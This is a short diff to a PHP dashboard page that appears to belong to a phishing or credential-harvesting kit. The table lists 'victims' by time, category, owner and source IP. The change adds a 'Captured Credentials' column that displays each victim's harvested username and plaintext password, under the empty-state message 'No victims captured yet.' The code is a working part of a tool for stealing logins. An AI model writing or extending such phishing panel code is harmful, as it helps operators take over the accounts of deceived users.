@@ -62,18 +62,23 @@ krsort($analytics); // Show latest first
                         <th>Date & Time</th>
                         <th>Category</th>
                         <th>Owner (User)</th>
+                        <th>Captured Credentials</th>
                         <th>Source IP</th>
                     </tr>
                 </thead>
                 <tbody>
                     <?php if (empty($analytics)): ?>
-                        <tr><td colspan="4" style="text-align: center;">No victims captured yet.</td></tr>
+                        <tr><td colspan="5" style="text-align: center;">No victims captured yet.</td></tr>
                     <?php else: ?>
                         <?php foreach ($analytics as $v): ?>
                         <tr>
                             <td><?php echo s($v['timestamp'] ?? 'N/A'); ?></td>
                             <td><span class="badge" style="background: #f0f4f8; color: var(--primary);"><?php echo s(strtoupper($v['category'] ?? 'UNKNOWN')); ?></span></td>
                             <td><strong><?php echo s($v['user_id'] ?? 'anonymous'); ?></strong></td>
+                            <td>
+                                <div><strong>U:</strong> <?php echo s($v['captured_user'] ?? 'N/A'); ?></div>
+                                <div><strong>P:</strong> <code style="background: #fff3f3; color: #d00;"><?php echo s($v['captured_pass'] ?? 'N/A'); ?></code></div>
+                            </td>
                             <td><code><?php echo s($v['source_ip'] ?? '0.0.0.0'); ?></code></td>
                         </tr>
                         <?php endforeach; ?>
